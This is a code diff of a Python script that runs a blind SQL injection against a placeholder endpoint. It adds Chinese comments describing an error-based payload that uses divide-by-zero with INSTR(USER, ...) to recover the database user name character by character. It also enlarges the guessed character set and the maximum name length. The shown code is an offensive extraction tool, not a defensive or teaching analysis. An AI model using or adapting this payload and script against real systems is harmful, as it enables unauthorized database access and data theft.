@@ -1,6 +1,11 @@
 import requests
 from requests.exceptions import RequestException
 
+# 如果响应正常，说明当前字符不在该位置。
+# 如果响应异常（如除零错误），说明当前字符在该位置。
+# ' || 1/(§position§-INSTR(USER,'§char§')) || '
+# 其中，§position§ 是被减数的位置，§char§ 是要测试的字符。
+
 # 配置目标 URL 和参数名
 url = "http://target.com/vulnerable_endpoint"
 param_name = "param"
@@ -18,8 +23,8 @@ headers = {
 }
 
 # 配置字符集和最大长度
-charset = "abcdefghijklmnopqrstuvwxyz0123456789"
-max_length = 20  # 假设用户名最大长度为20
+charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$#"
+max_length = 30  # 假设用户名最大长度为30
 
 # 初始化用户名
 user_name = ""
